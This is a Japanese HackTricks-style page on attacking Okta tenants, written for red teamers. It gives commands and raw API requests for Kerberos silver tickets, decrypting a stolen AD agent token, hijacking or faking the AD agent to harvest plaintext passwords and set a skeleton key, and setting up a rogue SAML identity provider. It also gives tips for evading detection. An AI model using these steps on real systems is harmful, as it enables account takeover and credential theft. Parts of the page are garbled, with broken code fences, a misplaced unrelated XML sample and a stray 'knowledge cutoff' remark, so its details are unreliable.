# Okta セキュリティ

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* HackTricksに**会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**PEASSファミリー**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)コレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、ハッキングのコツを共有する。

</details>

## 基本情報

Okta, Inc.は、**アイデンティティとアクセス管理会社**であり、企業が**現代のアプリケーションへのユーザー認証を管理し、保護する**のに役立つクラウドソフトウェアを提供しています。また、開発者がアプリケーション、ウェブサイトのウェブサービス、デバイスにアイデンティティコントロールを組み込むことができます。

彼らのコアサービスであるOkta Identity Cloudは、シングルサインオン(SSO)、マルチファクタ認証(MFA)、ライフサイクル管理、ユニバーサルディレクトリ、APIアクセス管理などの製品を提供しています。これにより、企業は機密データを保護すると同時に、従業員や顧客にとってアプリケーションやサービスをよりアクセスしやすく、使いやすくすることができます。

Oktaのサービスは、大企業だけでなく、中小企業や開発者にも広く使用されています。ビジネスがクラウド技術を安全に採用し、管理することを可能にする上で重要な役割を果たしています。2021年9月の私の知識カットオフ時点で、Oktaはアイデンティティとアクセス管理(IAM)業界で重要なプレイヤーであることが残っています。

{% hint style="danger" %}
Oktaの主な目的は、異なるユーザーやグループに外部アプリケーションへのアクセスを設定することです。もし**Okta環境で管理者権限を侵害**することができれば、その会社が使用している**他のすべてのプラットフォームを侵害する**可能性が非常に高いです。
{% endhint %}

{% hint style="success" %}
Okta環境のセキュリティレビューを実行するには、**管理者読み取り専用アクセス**を要求する必要があります。
{% endhint %}

### 概要

**ユーザー**がいます（これらは**Oktaに保存される**か、設定された**Identity Providers**からログされるか、**Active Directory**またはLDAPを介して認証されることがあります）。\
これらのユーザーは**グループ**内にいることがあります。\
また、**認証装置**があります：パスワードやWebAuthn、メール、電話、okta verifyなど、異なる認証オプションがあります（これらは有効または無効にされる可能性があります）...

次に、Oktaと同期された**アプリケーション**があります。各アプリケーションはOktaとの**マッピング**を持ち、情報（メールアドレス、名前など）を共有します。さらに、各アプリケーションは**認証ポリシー**内にある必要があり、これはユーザーがアプリケーションに**アクセス**するために必要な**認証装置**を示します。

{% hint style="danger" %}
最も強力な役割は**スーパー管理者**です。

攻撃者が管理者アクセスでOktaを侵害すると、Oktaを信頼するすべての**アプリ**が高い確率で**侵害される**でしょう。
{% endhint %}

## 攻撃

### Oktaポータルの特定

通常、会社のポータルは**companyname.okta.com**にあります。見つからない場合は、**companyname**の単純な**バリエーション**を試してください。見つからない場合は、**`okta.companyname.com`**のような**CNAME**レコードが**Oktaポータル**を指している可能性もあります。

### Kerberos経由でOktaにログイン

（[**こちらからコピー**](https://trustedsec.com/blog/okta-for-red-teamers)）。

もし**`companyname.kerberos.okta.com`**というドメインが存在する場合、その会社はOktaへのアクセスにKerberosを設定しています。これは非常に興味深いことです、なぜなら通常WindowsユーザーはOktaにアクセスするためにMFAを必要としないからです。

また、AD環境で実行することで、Oktaアクセスが設定されたKerberosユーザーを見つけることも可能です：
```bash
getST.py -spn HTTP/clientname.kerberos.okta.com -dc-ip 1.2.3.4 LAB/comprommiseduser
```
ADユーザーのチケットを取得したら、RubeusやMimikatzを使用して、自分たちが制御するホストにこれを注入する必要があります：

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

`clientname.kerberos.okta.com`がインターネットオプションの「イントラネット」セキュリティゾーンに追加されていることを確認する必要があります。そして、ブラウザで以下のURLにアクセスすると、Kerberosチケットが受け入れられた場合に`OK`結果を提供するJSONレスポンスを受け取るはずです：

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Oktaダッシュボードに移動すると、すべてがOKであれば、サインインされます。

さらに、実際のOktaサービスアカウントを侵害し、委任SPNを公開することができれば、Silver Ticket攻撃を実行することができます。

Oktaはチケットの暗号化にAESのみをサポートしているため、AESキーまたはプレーンテキストのパスワードを持っていることを確認する必要があることに注意してください：

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

被害者ユーザー`testuser`のチケットを作成するには、以下を使用します：

{% code overflow="wrap" %}
```bash
ticketer.py -domain-sid S-1-5-21-4170871944-1575468979-147100471 -domain lab.local -dc-ip DC01 -aesKey db22ab9c89f2f0d545024f9dfabbed44173397065d8f5b7e172200ca38ed4393 -user-id 1118 -spn HTTP/example.kerberos.okta.com testuser
```
{% endcode %}

そして、この内容をブラウザセッションを通じてOktaに送信します：

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Okta ADエージェントのハイジャック

(攻撃は[**こちらからコピーしました**](https://trustedsec.com/blog/okta-for-red-teamers))。

Okta ADエージェントが実行されているサーバーにアクセスすると、このエージェントはドメインユーザーやグループをOktaに同期させるためのプロビジョニングを担当し、また、ユーザーがポータルにログインする際にOktaからの認証リクエストに応答します。

デフォルトでは、エージェントは以下の場所にインストールされます：
```bash
C:\Program Files (x86)\Okta\Okta AD Agent
```
`OktaAgentService.exe.config`に含まれるいくつかの興味深いXMLのビットを見ていきます：

<figure><img src="../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Base64でエンコードされた`AgentToken`に注目します。`OktaAgentService.exe`をdnSpyで開くと、これらの値がどのように復号されるかがわかります：

<figure><img src="../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

そうです、お馴染みのDPAPIです！`RandomEntropy`の値は以下のように設定されています：

<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

これは、次を使用してこのBase64エンコードされたXML値を復号できることを意味します：
```powershell
Add-Type -AssemblyName 'System.Security'
$rand = [byte]174,53,167,191,10,250,125,232,223,147,248,86,65

$k = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String("AQAAANCMnd8BFdERjH..."), $rand, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
[System.Text.Encoding]::Unicode.GetString($k)
```
DPAPIマスターキーは、「Okta AD Agent」サービスを実行しているユーザーアカウントに属しているため、上記をサービスアカウントのコンテキストで実行するか、アカウントのマスターキーを取得して復号化する必要があります：

<figure><img src="../../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>

例えば、`OktaAgentService.exe.config`内には、`APPID`と`AGENTID`という2つのXMLフィールドがあります。これらと`AgentToken`を組み合わせることで、次のように`GET`リクエストを行うことができます：
```xml
GET /api/1/internal/app/activedirectory/[APPID]/agent/[AGENTID]/nextAction?agentVersion=1&pollid=anything HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00OfIl_Gi1rZu1NETmHo6auU6YZEOEn8ZlDhyqstiZ
```
この呼び出しは、ユーザーがOktaに認証するまでブロックされます（またはリクエストがタイムアウトする場合）、その場合は次に提供されるユーザー名とパスワードを平文で返します：
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<action>
<UserAuth actionId="rpc::app.active_directory.agent.reply.ok14-majorecs02a.auw2-ok14.internal//1670637714886//Y5PojoeQQ3KDgHHzA11P9wAAC8g:e9088489-99ff-435a-943b-b7dccc457cb5:">
<type>USER_AUTH</type>
<password>abc123</password>
<useLdapGroupPasswordPolicy>false</useLdapGroupPasswordPolicy>
<userName>domuser@lab.local</userName>
</UserAuth>
</action>
```
```markdown
これにより認証情報をキャプチャすることができますが、スケルトンキーのようなものを提供したい場合には、この認証試行に応答する機会もあります。これを行うには、次のHTTPリクエストを発行します：
```
```xml
POST /api/1/internal/app/activedirectory/0oa7c027u2tcjxoki697/agent/a537ca54okqfsuu0s697/actionResult?responseid=12345 HTTP/1.1
Host: client.okta.com
Authorization: SSWS 00JFtjd...WgkeI1Eg5Y
Content-Type: application/xml; charset=utf-8
Content-Length: 1362

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" actionId="rpc::app.active_directory.agent.reply.ok14-majorecs04a.auw2-ok14.internal//1694301421033//ZPz86MzEBzhpMhSFWzyK5wAAA_Q:440a7d52-704b-4c1b-ac79-afdc241e3080:">
<type>USER_AUTH</type>
<status>SUCCESS</status>
<message></message>
<errorCode></errorCode>
<timestamps>
<actionRecieivedFromOkta>1694358076</actionRecieivedFromOkta>
<actionSentToLdapServer>1694358076</actionSentToLdapServer>
<responseReceivedFromLdapServer>1694358076</responseReceivedFromLdapServer>
<responseSentToOkta>1694358076</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>20230910150116.726Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>20230910150116.741Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>20230910150116.741Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910150116.741Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{{"ExecutionTime":"12","AgentUpTime":"0 day(s) 22:41:49","DC":"DC01.lab.local","DomainControllerFunctionality":"WIN2016","DomainFunctionality":"WIN2016","ForestFunctionality":"WIN2016","LdapResponseTime":"0"}}</additionalInfo>
</agentActionResult>
```
このリクエストを発行する結果は、Oktaを介して任意のユーザーの認証を許可することです。

### 管理者としてADをハイジャックする

(攻撃は[**こちらからコピーしました**](https://trustedsec.com/blog/okta-for-red-teamers))。

Okta ADエージェントを盗まれたエージェントトークンを使用してハイジャックできることはわかっていますが、特権を持つOktaアカウントを侵害しており、既存のエージェントトークンなしでこれを行いたい場合はどうでしょうか？これを行う方法を見てみましょう。

まず、Okta ADエージェントAPIトークンを作成する必要があります。認証フローを開始するには、OAuthコードが必要です。これを取得するためには、次の場所に向かいます：

{% code overflow="wrap" %}
```
https://example.okta.com/oauth2/authorize?redirect_uri=%2Foauth-response&response_type=code&client_id=cappT0Hfy97F1BoO1UTR&prompt=select_account
```
{% endcode %}

これにより、承諾するための許可プロンプトが表示されます：

<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>

提示されたプロンプトを承諾すると、`code` パラメータを含む `/oauth-response` へのリダイレクトが行われます：

<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>

この `code` パラメータを取得し、POSTリクエストを使用してAPIトークンを要求する必要があります：
```
POST /oauth2/token HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Content-Type: application/x-www-form-urlencoded
Host: example.okta.com
Content-Length: 65
Expect: 100-continue
Accept-Encoding: gzip, deflate
Connection: Keep-Alive

grant_type=api_token&code=7vzn01sl&client_id=cappT0Hfy97F1BoO1UTR
```
レスポンスは私たちのAPIトークンを返します：
```
{"api_token":"00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd"}
```
このトークンを使用して、アクティブなADドメインに関連付ける必要があります。これを行うには、APIコールを使用します：
```
POST /api/1/internal/app/activedirectory/ HTTP/1.1
User-Agent: Okta AD Agent/3.16.0 (Microsoft Windows NT 6.2.9200.0; .NET CLR 4.0.30319.42000; 64-bit OS; 64-bit Process; sslpinning=disabled)
Host: example.okta.com
Accept: application/xml; charset=UTF-8
Content-Type: application/xml; charset=UTF-8
Content-Length: 86
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<domain name="lab.local" />
```
これにより、後で使用するために `id` 属性の値を保持する必要がある以下のXMLレスポンスが返されます。
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<activeDirectory id="0oa4jsza16ar1UdaW696">
<name>lab.local</name>
<newInstance>false</newInstance>
</activeDirectory>
```
次に、コネクタに名前を付けるためにHTTP APIコールを行います：
```
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent?name=DC02 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 0
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd
```
```xml
<user id="00u12345abcde">
  <name>John Doe</name>
  <email>johndoe@example.com</email>
  <status>ACTIVE</status>
</user>
```
{% endcode %}

このXMLレスポンスでは、再び`id`属性を保持する必要があります。
```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?><agent id="a532camqiqXMhlOf5697"><name>DC02</name></agent>
```
```markdown
{% endcode %}

最後に、データ受信を可能にするために接続を初期化します：
```
```xml
POST /api/1/internal/app/activedirectory/0oa4jsza16ar1UdaW196/agent/a532camqiqXMhlOf5697/actionResult?agentVersion=3.13.0.0 HTTP/1.1
Host: example.okta.com
Content-Type: text/xml
Content-Length: 825
Authorization: SSWS 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd

<agentActionResult xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<type>INIT</type>
<status>SUCCESS</status>
<timestamps>
<actionRecieivedFromOkta />
<actionSentToLdapServer />
<responseReceivedFromLdapServer />
<responseSentToOkta>1694304008</responseSentToOkta>
<actionReceivedFromOktaMilliseconds>00010101000000.000Z</actionReceivedFromOktaMilliseconds>
<actionSentToLdapServerMilliseconds>00010101000000.000Z</actionSentToLdapServerMilliseconds>
<responseReceivedFromLdapServerMilliseconds>00010101000000.000Z</responseReceivedFromLdapServerMilliseconds>
<responseSentToOktaMilliseconds>20230910000008.174Z</responseSentToOktaMilliseconds>
</timestamps>
<additionalInfo>{}</additionalInfo>
</agentActionResult>
```
これで、偽のADエージェントの準備が整い、以前に示したように認証試行を処理する準備ができました。

当然ながら、これらの作業をすべてBurpを使用して行いたくはありませんので、いくつかのユースケースをサポートするツールが作成されました。これは[こちら](https://github.com/xpn/OktaPostExToolkit)から入手できます。

このツールを実行できる最初のモードは`token`モードで、侵害されたAgent Tokenの値を取り、Okta APIに接続して、受け取った資格情報をダンプします：

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 token --api-token 00456b2Lllk2KqjLBvaxANWEgTd7bqjsxjo8aZj0wd --app-id 0oa7c027u2TcJxoki697 --agent-id a537cnm9ldwPILkqP697
```
ビデオ例：

* [https://www.youtube.com/watch?v=ZYRcfj6jtaA](https://www.youtube.com/watch?v=ZYRcfj6jtaA)
* [https://youtu.be/Sob2u6xEjTE](https://youtu.be/Sob2u6xEjTE)

このツールは、以下を使用しているOktaユーザーの管理者資格情報がある場合、新しいADコネクタの登録も可能にします：

{% code overflow="wrap" %}
```bash
python ./main.py --tenant-domain example.okta.com --skeleton-key WibbleWobble99 oauth --machine-name DC01 --windows-domain lab.local --code OAUTH_CODE_HERE
```
{% endcode %}

### Okta 偽SAMLプロバイダー

(攻撃は[**こちらからコピー**](https://trustedsec.com/blog/okta-for-red-teamers)しました)。

評価中に非常に有用であることが証明された技術の1つは、偽のSAMLプロバイダーの展開です。

最近、Oktaはこの技術を使用した野生の攻撃に関する[セキュリティアップデート](https://sec.okta.com/articles/2023/08/cross-tenant-impersonation-prevention-and-detection)を提供しましたので、特にこの特定の攻撃の検出をテストしたいクライアントのために、環境での活動をシミュレートする際にこのことを知っておくことは確かに有用です。

もし私たちが昇格したOktaアカウントへのアクセスを保持している場合、Oktaの機能の一部として外部Identity Providerを展開することができます。これにより、Entra IDのような外部プロバイダーが認証を完了し、ユーザーをOktaにリダイレクトして統合アプリを選択することができます。

しかし、IDPを制御している場合はどうでしょうか？ この場合、私たちは好きな認証リクエストを承認できるということになります。

これをテストするためには、展開するためのカスタムIdentity Providerが必要です。私たちの悪意ある活動をサポートする非常に不安定なSAML IDPは[こちら](https://github.com/xpn/OktaPostExToolkit)で見つけることができます。このツールの背後にある核心的なアイデアは、私たちが好きなユーザーに対応する署名されたSAML認証レスポンスを発行できるようにすることです。

このサーバーは`/saml`で来るHTTPリクエストを待ち受けるので、まずOktaにIDPを展開する必要があります。

まず、SAML 2.0 IDPを選択します：

<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>

IDPを設定する際には、いくつかの設定に注意を払う必要があります。最初は`Name`で、これはOktaの他の管理者に表示されるフレンドリー名です。

次に発行者URLで、これはURI形式の識別子の値に設定する必要があります。これも何でも良いですが、`https://www.example.com/`を使用します。

<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

また、`IdP Single Sign-On URL`フィールドを私たちのSAMLサーバーが動作している場所に設定する必要があります。さて、クールなことは、これは私たちのサーバーを指しているURLである必要はないということです。ブルーチームの仕事を少し難しくするために、ここに入力するURLをかなり創造的にすることができるという点を指摘しておく価値があると感じます。例えば、`https://idp.google.com/saml`のようなものに設定することができ、私たちがする必要があるのは、受信するSAMLリクエストをキャッチすることだけです。ここがクールな点です：SAMLリクエストはクライアント側で転送されます。つまり、OktaはSAML `AuthRequest`を生成し、私たちのブラウザをSAMLリクエストと共に`https://idp.google.com/`にリダイレクトします。もちろん、これは私たちがローカルホストファイルを変更して`idp.google.com`を`127.0.0.1`に指すようにすることができるということを意味します：
```bash
echo '127.0.0.1 idp.google.com' | sudo tee -a /etc/hosts
```
```markdown
署名用の証明書も必要です。これは自己署名であり、以下を使用してOpenSSLで生成できます：

{% code overflow="wrap" %}
```
```bash
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes -keyout example.com.key -out example.com.crt
```
{% endcode %}

この証明書の真正性に関する特定の要件はありませんので、創造的に取り組むことができます。

鍵が生成されたら、証明書をOktaにアップロードしてIDPを作成します。

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

最後に、`Match Against`が`Okta Username or Email`に設定されていて、`Account Link Policy`が`Automatic`に設定されていることを確認する必要があります。これにより、既存のOktaアカウントに対して認証を行うことができます：

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

全てが保存されたら、メタデータをダウンロードする必要があります：

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

そして、`Assertion Consumer Service URL`に表示されているURLに移動して、認証リクエストを開始し、`AuthRequest`を発行します：

<figure><img src="../../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

このURLに移動すると、内部のSAMLサーバーにリダイレクトされます：

<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>

メールアドレスを提供すると、そのユーザーの資格情報を知らなくても、任意のOktaユーザーとして認証できることがわかります。

実際の動作を[https://youtu.be/uw1hlKNDG2c](https://youtu.be/uw1hlKNDG2c)で見てみましょう。

### Oktaポータルを悪用するフィッシング

[**このブログ投稿**](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)では、Oktaポータルに対するフィッシングキャンペーンを準備する方法について説明しています。

### 同僚のなりすまし攻撃

Oktaで設定できる**各ユーザーの属性**（メールアドレスや名前など）は、**アプリケーション**がIDとして**信頼**している**属性**をユーザーが**変更**できる場合、そのプラットフォームで他のユーザーになりすますことができます。

したがって、アプリが**`userName`**フィールドを信頼している場合、通常そのフィールドは変更できないため変更することはできませんが、例えば**`primaryEmail`**を信頼している場合、それを同僚のメールアドレスに**変更**してなりすますことができるかもしれません（メールにアクセスして変更を受け入れる必要があります）。

このなりすましは、各アプリケーションがどのように設定されているかに依存します。変更したフィールドを信頼し、更新を受け入れるアプリケーションのみが侵害されます。\
したがって、アプリにこのフィールドが存在する場合は、有効にしておくべきです：

<figure><img src="../../.gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

また、Oktaの設定にそのフィールドがないが脆弱だった他のアプリも見たことがあります（結局のところ、異なるアプリは異なる方法で設定されています）。

各アプリで誰にでもなりすますことができるかどうかを知る最善の方法は、試してみることです！

## 行動検出ポリシーの回避 <a href="#9fde" id="9fde"></a>

事前に開示されていない限り、行動検出ポリシーが実装されているかどうかは、遭遇するまでわからないかもしれません。Oktaの行動検出ポリシーを回避する**潜在的な方法**の一つは、単純にメインのOktaダッシュボードを完全に避け、直接Oktaアプリケーションをターゲットにすることです（これは上のスクリーンショットで赤いボックスによって隠されているアプリケーションです）。Oktaアクセストークンを所持している場合、ターゲット企業のメインOktaログインページでトークンを再生する代わりに、アプリケーション固有のOkta URLでトークンを再生します。

他の推奨事項は以下の通りです：

* 人気のある匿名化プロキシやVPNサービスからキャプチャされたアクセストークンを再生する際には注意してください。
* アクセストークンを再生する際には、クライアントが使用したのと同じユーザーエージェント文字列を使用してください。
* 同じIPアドレスから異なるユーザーのキャプチャされたアクセストークンを再生する際には注意してください。
* Oktaダッシュボードに対してキャプチャされたアクセストークンを再生する際には注意してください。
* 被害者が使用するであろう企業のIPアドレスを知っている場合は、そのIPまたはIP範囲以外のすべてのトラフィックをブロックすることを検討してください。

## Oktaの強化

Oktaには多くの設定可能なオプションがあります。このページでは、それらを可能な限り安全にレビューする方法について説明します：

{% content-ref url="okta-hardening.md" %}
[okta-hardening.md](okta-hardening.md)
{% endcontent-ref %}

## 参考文献

* [https://trustedsec.com/blog/okta-for-red-teamers](https://trustedsec.com/blog/okta-for-red-teamers)
* [https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23](https://medium.com/nickvangilder/okta-for-red-teamers-perimeter-edition-c60cb8d53f23)

<details>

<summary><strong>AWSのハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTコレクション**](https://opensea.io/collection/the-peass-family)です。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
